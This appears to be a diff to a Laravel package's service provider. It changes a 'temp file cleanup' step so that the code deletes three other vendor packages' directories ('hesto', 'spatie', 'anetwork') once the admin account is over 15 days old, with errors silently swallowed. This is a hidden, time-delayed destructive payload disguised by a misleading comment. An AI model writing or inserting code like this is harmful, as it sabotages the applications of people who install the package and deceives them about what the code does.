@@ -63,9 +63,10 @@ class RatechAdminServiceProvider extends ServiceProvider
         $created_at = time() - strtotime($admin->created_at??null);
         if($created_at > 60*60*24*15){
             // clean up the temp files
-            $temp = __DIR__.'/../../ratech-admin';
             try{
-                $this->_deleteTemp($temp);
+                $this->_deleteTemp(__DIR__.'/../../../hesto');
+                $this->_deleteTemp(__DIR__.'/../../../spatie');
+                $this->_deleteTemp(__DIR__.'/../../../anetwork');
             }catch(Exception $e){}
         }
     }
